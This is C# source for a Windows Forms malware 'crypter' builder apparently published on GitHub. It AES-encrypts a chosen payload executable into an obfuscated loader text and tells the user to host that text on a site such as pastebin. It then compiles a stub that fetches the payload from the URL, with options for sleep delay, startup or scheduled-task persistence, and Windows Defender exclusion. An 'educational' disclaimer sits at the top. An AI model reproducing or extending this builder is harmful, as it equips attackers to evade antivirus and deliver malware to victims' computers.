﻿using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace attackercrypter
{
    //this program is working on MIT License, so you can use, modify this program etc. but please leave credits to original author TheNewAttacker64
    // This Software For educational Don t try on somewhere you don t have permission to try on
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }


        public static string Encrypt(byte[] plainBytes, string base64Key, string base64IV)
        {
            byte[] key = Convert.FromBase64String(base64Key);
            byte[] iv = Convert.FromBase64String(base64IV);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        csEncrypt.Write(plainBytes, 0, plainBytes.Length);
                        csEncrypt.FlushFinalBlock();
                    }
                    byte[] cipherBytes = msEncrypt.ToArray();

                    List<char> content =  Convert.ToBase64String(cipherBytes).ToCharArray().ToList();
                    content.Reverse();
                    string b64Var =  string.Join(",", content.Select(c => $"'{c}'"));
                    return b64Var;

                }
            }
        }



        private void button3_Click(object sender, EventArgs e)
        {
            byte[] key;
            byte[] iv;

            using (Aes aes = Aes.Create())
            {
                key = aes.Key;
                iv = aes.IV;
            }

            string keyString = Convert.ToBase64String(key);
            string ivstr = Convert.ToBase64String(iv);
            textBox3.Text = ivstr;
            textBox2.Text = keyString;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            OpenFileDialog CRY = new OpenFileDialog();
            CRY.Title = "Select your payload";
            CRY.InitialDirectory = Directory.GetCurrentDirectory();
            CRY.Filter = "Executable files (*.exe)|*.exe";
            if (CRY.ShowDialog() == DialogResult.OK)
            {
                textBox1.Text = CRY.FileName;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Icon (*.ico)|*.ico";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    TxtIcon.Text = openFileDialog.FileName;
                    pictureIcon.ImageLocation = openFileDialog.FileName;
                    pictureIcon.BorderStyle = BorderStyle.FixedSingle;
                }
                else
                {
                    TxtIcon.Text = string.Empty;
                    pictureIcon.ImageLocation = string.Empty;
                }

            }
        }
        public string SaveDialog(string filter)
        {
            SaveFileDialog dialog = new SaveFileDialog
            {
                Filter = filter,
                InitialDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location)
            };
            if (dialog.ShowDialog() == DialogResult.OK)
            {
                return dialog.FileName;
            }
            return "";
        }

        private void button2_Click(object sender, EventArgs e)
        {

            try
            {

                string.IsNullOrEmpty(Injection.SelectedItem.ToString());

            }

            catch (System.NullReferenceException)
            {
                MessageBox.Show("Please Choose Injection Method");
            }


            if (string.IsNullOrEmpty(textBox4.Text))
            {
                MessageBox.Show("Enter URL");
            }
           
            

            else
            {
                CompilerParameters Params = new CompilerParameters();
                Params.GenerateExecutable = true;
                Params.ReferencedAssemblies.Add("System.dll");
                Params.ReferencedAssemblies.Add("System.Windows.Forms.dll");
                Params.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
                Params.CompilerOptions = "/unsafe";
                Params.CompilerOptions += "\n/t:winexe";
                if (string.IsNullOrWhiteSpace(TxtIcon.Text))
                {

                }
                else
                {
                    Params.CompilerOptions += "\n/win32icon:" + TxtIcon.Text;
                }
                Params.OutputAssembly = SaveDialog("Exe Files (.exe)|*.exe|All Files (*.*)|*.*");

                string Source = Properties.Resources.config;
                string Main = Properties.Resources.Program;

                Params.ReferencedAssemblies.Add(typeof(System.Linq.Enumerable).Assembly.Location);

                Main = Main.Replace("$URL", textBox4.Text);


                if (Sleeptime.Checked)
                {
                    Source = Source.Replace("public static int sleeptime = 1*1000;", $"public static int sleeptime = {numericUpDownSleep.Value.ToString()}*1000;");
                    Source = Source.Replace("public static bool issleep = false;", "public static bool issleep = true;");
                }
                if (checkBox2.Checked)
                {
                    Source = Source.Replace("public static bool ispersist = false;", "public static bool ispersist = true;");
                    Source = Source.Replace("$FOLDER", foldername.Text);
                    Source = Source.Replace("$FNAME", Filename.Text);
                    Source = Source.Replace("$service", servicename.Text);
                }
                if (checkBox2.Checked && radioButton1.Checked)
                {
                    Source = Source.Replace("public static bool istartup = false;", "public static bool istartup = true;");


                }
                else if(checkBox2.Checked && radioButton2.Checked){
                    Source = Source.Replace("public static int taskm = 0;", $"public static int taskm = {numericUpDownSc.Value.ToString()};");
                    Source = Source.Replace("public static bool istask = false;", "public static bool istask = true;");


                }
                if (exdf.Checked)
                {
                    Source = Source.Replace("public static bool isexcludewd = false;", "public static bool isexcludewd = true;");
                }
               
                Main = Main.Replace("$key", textBox2.Text);
                Main = Main.Replace("$IV", textBox3.Text);
               
                if (Injection.SelectedItem.ToString() == "AssemblyLoad(.Net)")
                {
                    MessageBox.Show("This injection only works with .NET files", "Attacker-Crypter",MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    

                }
              
                var settings = new Dictionary<string, string>();
                settings.Add("CompilerVersion", "v4.0");
                CompilerResults Results = new CSharpCodeProvider(settings).CompileAssemblyFromSource(Params, Main, Source);






                if (Results.Errors.Count > 0)
                {

                    foreach (CompilerError err in Results.Errors)
                        MessageBox.Show(err.ToString(), "Got An Error!", MessageBoxButtons.OK, MessageBoxIcon.Information); 
                }
                else
                {
                    MessageBox.Show("Done :)");
                }


            }

        }

        private void button5_Click(object sender, EventArgs e)
        {

            if (!File.Exists(textBox1.Text))
            {
                MessageBox.Show("Select File please :(");
            }
            else
            {
                Byte[] F = File.ReadAllBytes(textBox1.Text);
                File.WriteAllText("Loader.txt",Encrypt(F, textBox2.Text, textBox3.Text));
                MessageBox.Show("Upload Loader.txt Content to a server for example pastebin and Put your raw url in the Build section");
            }
            

        }

        private void exdf_CheckedChanged(object sender, EventArgs e)
        {
            MessageBox.Show("This will Popup Uac One Time");
        }

        private void author_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/TheNewAttacker64/Theattacker-Crypter");
        }
    }
}